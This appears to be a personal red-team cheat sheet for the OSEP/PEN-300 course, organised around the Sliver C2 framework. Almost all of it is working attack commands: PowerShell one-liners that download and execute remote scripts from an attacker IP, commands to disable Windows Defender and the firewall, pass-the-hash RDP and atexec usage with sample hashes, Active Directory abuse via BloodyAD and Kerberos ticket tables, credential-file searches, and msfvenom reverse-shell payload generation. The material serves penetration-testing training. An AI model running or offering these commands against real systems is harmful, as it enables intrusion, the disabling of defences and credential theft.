# ToolLibrary 

This project was started as a means to better organize each repo along with a how-to guide for generalized execution and execution through a C2 agent. In my case, the agent of choice was Sliver Interactive Beacons and much of the exploits are specific to the OSEP or PEN300 course. 

As such, this repo is still in private and will not be published as some of the exploits are challenge or exercise specific. 

# Kali - must know stuff
```bash
# Base64 encoding via Kali
echo "string" | base64 -w0 # base64 encoding, -w0 is nowrap syntax

┌──(kali㉿kali)-[/mnt/…/SharedVMFolder/Backups/PEN-300/Challenge04]
└─$ echo "iex(iwr http://192.168.45.227/ligolo.ps1 -UseBasicParsing)" | base64 -w0
```

# From Kali - Enumeration
## nmap
```bash
# will give list of hosts and ports
┌──(kali㉿kali)-[~/] 
└─$ nmap 192.168.100.0/24 -p- --min-rate=5000 

# add IPs and Ports found in previous nmap
┌──(kali㉿kali)-[~/] 
└─$ nmap -sCV 192.168.100.100-105 -p 80,445,3389 --min-rate=5000 
```

# From Kali - Connection
## RDP to host:
```bash
┌──(kali㉿kali)-[/]
└─$ xfreerdp /v:192.168.243.159 /u:offsec /p:'lab' /cert-ignore /compression +dynamic-resolution +clipboard

┌──(kali㉿kali)-[/]
└─$ rdesktop -a 16 -z -r sound:remote -x b -u offsec -p lab 192.168.243.159
```

# From Kali - Connections with Loot (passwords/hashes/tickets)
## RDP to host: 
```bash
# NTLM Auth: 
┌──(kali㉿kali)-[/]
└─$ xfreerdp /v:192.168.243.159 /u:offsec /pth:'<NTLM HASH>' /cert-ignore /compression +dynamic-resolution +clipboard

# Remove RDP restrictions
┌──(kali㉿kali)-[/]
└─$ netexec smb db01 -u administrator -H faf3185b0a608ce2f8afb6f8d133f85b --local-auth -X 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f;reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0;netsh firewall set service remoteadmin enable;netsh firewall set service remotedesktop enable' --exec-method atexec
```

## ATSVC exposed RPC 
```bash
# Microsoft AT-Scheduler Service (ATSVC) RPC exploitation with user credentials
┌──(kali㉿kali)-[/]
└─$ atexec.py test.local/offsec:pass@10.10.10.1 whoami

# Microsoft AT-Scheduler Service (ATSVC) RPC exploitation with user hashes
┌──(kali㉿kali)-[/]
└─$ atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 test.local/offsec@10.10.10.1 whoami
```

# Post Exploitation 

# Windows Privilege Escalation

# TO DO 
- Get to run it in Sliver Agent - [PrivescCheck](https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1): `Invoke-PrivescCheck -Report PrivescCheck_$($env:COMPUTERNAME) -Format HTML`
- Get to run dependably in Sliver agent (session timeouts all too common) - [winPEAS](https://raw.githubusercontent.com/peass-ng/PEASS-ng/refs/heads/master/winPEAS/winPEASps1/winPEAS.ps1): `iex(iwr http://192.168.45.227/winPEAS.ps1 -usebasicparsing)`
- better writeup for SeatBelt.exe


# Windows Defender and Firewall Commands

## Sliver 
```bash
# Disable Defender (requires elevated)
sliver (sessionID) > execute -o "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all
```

## References 
beauknowstech modified version of emanuelepicas dropAV_AND_More.ps1 https://github.com/emanuelepicas/OSEP/edit/master/AV-Evasion/DisableSecuritySettings/dropAV_AND_More.ps1

Drop AV PS Script: ToolLibrary/AV/dropav.ps1

```bash
# sliver powershell script run via sharpsh

┌──(kali㉿kali)-[~/]
└─$ echo -n "irm http://192.168.x.x/dropav.ps1 | IEX" | base64
sliver (sessionID) > sharpsh -o '<base64 encoded - irm http://192.168.x.x/dropav.ps1 | IEX>'
```

## Basic CLI commands 

| Description                                        | Command                                                                               |
| -------------------------------------------------- | ------------------------------------------------------------------------------------- |
| Disable firewall - New way                         | netsh advfirewall set allprofiles state off                                         |
| Disable Firewall - Old way                         | netsh firewall set opmode disable                                                   |
| Disable firewall service (can only run as SYSTEM?) | net stop mpssvc                                                                     |
| Current firewall profile                           | netsh advfirewall show currentprofile                                               |
| Firewall rules                                     | netsh advfirewall firewall show rule name=all                                       |
| Show open ports                                    | netstat -ano                                                                       |
| Network Information                                | ipconfig /all                                                                      |
| EXE Exclusion                                      | Add-MpPreference -ExclusionExtension ".exe"                                         |
| Turn off Virus & Threat Detection                  | Set-MpPreference -DisableRealtimeMonitoring $true                                   |
| Remove all definitions                             | cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all |


# Useful Basic Commands

## Run command as another user:
- `runas.exe /netonly /user:domain.com\admin cmd.exe`

```bash
# Sliver runas (windows only) run process in context of designated user
runas --username --process --args (arguments for process) [--password] [--domain]
```

# Enumeration
```powershell
# Search for SSH keys in Users directory:
Get-ChildItem -Path C:\Users -Include .ssh -Directory -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Get-ChildItem -Path $_.FullName -File -Recurse -ErrorAction SilentlyContinue }

# Search for interesting files:
Get-ChildItem -Path C:\Users -Include *.xml,*.txt,*.ps1,*.pdf,*.xls,*.xlsx,*.doc,*.docx,id_rsa,authorized_keys,*.exe,*.log -File -Recurse -ErrorAction SilentlyContinue

# Search for (CTF) related files: 
Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Name -in "proof.txt", "local.txt", "secret.txt" }

# Powershell History Path:
PS > C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Sticky Notes Path:
PS > C:\Users\*\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\
```

# Windows Privilege Escalation with Sliver
```bash
# sliver getsystem autoexploit
sliver (sessionID) > getsystem

# sliver + donut + privesc.exe
```

# Domain Enumeration with PowerView

## Domain/DC Information
- `Get-NetDomain` - Query basic domain info  
- `Get-NetDomain -Domain megacorp.com` - Query basic info of trusted domain.  
- `Get-NetDomainController` - Information of the DC, IP Included.  
- `Get-NetDomainController -Domain megacorp.com` - Information about another DC, IP Included.  
- `Get-DomainSID` - Query the domain SID.
- `Get-NetGroupMember -GroupName "Enterprise Admins" -Domain moneycorp.local` - Query specific group information including their SID.
- `Get-DomainPolicy` - Query domain policy information.

## Domain Users/Groups Enumeration

-   `Get-NetUser -UACFilter NOT_ACCOUNTDISABLE | select samaccountname, description, pwdlastset, logoncount, badpwdcount` - Basic user enabled info
-   `Get-NetUser | select cn` - Get the whole domain users.
-   `Get-NetUser | select cn,description` - All user's description.
-   `Get-DomainUser -PreauthNotRequired -verbose | select samaccountname` - ASREPRoastable users. (GetNPUsers)
-   `Get-NetUser -SPN` - Kerberoastable users
-   `Get-DomainSPNTicket -SPN "MSSQLSvc/sqlserver.targetdomain.com"` - Query SPN hashes (for offline cracking mostly).
-   `Get-UserProperty -Properties description` - Descriptions of all domain users.
-   `Find-UserField -SearchField Description -SearchTerm "password"` - Search for the `password` string in the user's description.
-   `Get-NetGroup -GroupName *admin*` - Show all groups has the `admin` word in it.
-   `Get-NetGroupMember -Identity "Domain Admins" -Recurse` - Get all domain admins in the domain.

## Domain Computers Enumeration
- `Get-NetComputer` - Query all domain joined computers in the current domain.
- `Get-NetComputer -FullData` - Query all the machines in the domain with full properties.
- `Get-NetComputer -FullData | select name` - Query NetBIOS computer names (not FQDN).
- `Get-NetComputer -OperatingSystem "*Server 2016*"` - Query specific operating system computers.
- `Get-NetComputer -Ping` - Check alive hosts.

## Sessions
- `Get-NetSession -ComputerName sv-dc01` - Query active sessions on the remote computer.  
- `Get-NetLoggedOn -ComputerName svclient08` - Query logged on users from a target computer.
- `Get-LoggedonLocal -ComputerName megacorp.com` - Query locally logged users on a computer.

## Enumerate GPO applied in specific OU
- `Get-NetGPO -GPOname "{AB..81}"` - Query GPO applied on an OU.
- `Get-DomainOU -OUName StudentMachines | %{Get-NetComputer -ADSpath $_}` - Query computers in specific OU.
- `Get-DomainGPO | select displayname`  - Show all domain GPO's name.

## Enumerate Trusts

- `Get-NetForestDomain -Verbose` - All domains in the current forest.
- `Get-NetDomainTrust` - Map the trusts of the current domain.
- `Get-NetForestDomain -Forest eurocorp.local -Verbose | Get-NetDomainTrust` - Enumerate trusts for a trusting domain.
- `Get-NetGPOGroup` -  Get GPO's which use Restricted Groups or groups.xml for interesting users.

# TGS Abuse

|     Service Type          |   Service Silver Tickets |
| ------------------------- | ------------------------ |
| WMI                       | Host, RPCSS              |
| PowerShell Remoting       | HOST,HTTP                |
| WinRM                     | HOST,HTTP,WINRM          |
| Scheduled Tasks           | HOST                     |
| Windows File Share/PSEXEC | CIFS                     |
| Golden Tickets            | krbtgt                   |
| LDAP operations, included DCSync | LDAP              |

# BloodyAD Cheetsheet

| **Purpose**                                           | **Command**                                                                                                                              |
|-------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|
| Retrieve User Information                             | bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username                                                     |
| Add User To Group                                     | bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add                                      |
| Change Password                                       | bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password                                     |
| Give User GenericAll Rights                           | bloodyAD --host $dc -d $domain -u $username -p $password add genericAll $DN $target_username                                             |
| WriteOwner                                            | bloodyAD --host $dc -d $domain -u $username -p $password set owner $target_group $target_username                                        |
| Read GMSA Password                                    | bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username --attr msDS-ManagedPassword                         |
| Enable a Disabled Account                             | bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE                                   |
| Add The TRUSTED_TO_AUTH_FOR_DELEGATION Flag           | bloodyAD --host $dc -d $domain -u $username -p $password add uac $target_username -f TRUSTED_TO_AUTH_FOR_DELEGATION                      |
| Read LAPS Password                                    | bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime |
| Read LAPS Password (Kerberos Auth)                    | KRB5CCNAME=ted.ccache bloodyAD -k --dc-ip "192.168.202.120" --host dc03.infinity.com -d "infinity.com" get search --filter '(ms-mcs-admpwdexpirationtime=*)' --attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime |

# MSFVenom Payload Generation Cheetsheet
| Name                            | Payload                                                                                                                                                                                                                        |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Sliver 64bit Staged             | msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.227 LPORT=8064 EXITFUNC=thread -f csharp |
| Sliver 32bit Staged             | msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.227 LPORT=8086 EXITFUNC=thread -f csharp |
| msfvenom DLL 64bit              | msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.227 LPORT=8064 -f dll > reverse_64bit.dll |
| msfvenom DLL 32bit              | msfvenom -p windows/reverse_tcp -a x86 LHOST=192.168.45.227 LPORT=8064 -f dll > reverse_32bit.dll |
| HTA Reverse Shell               | msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.227 LPORT=8064 -f hta-psh -o evil.hta |
| Linux - x86 reverse shell       | msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.227 LPORT=443 -f elf > shell-x86.elf |
| Linux - x64 reverse shell       | msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.227 LPORT=443 -f elf > shell-x64.elf |

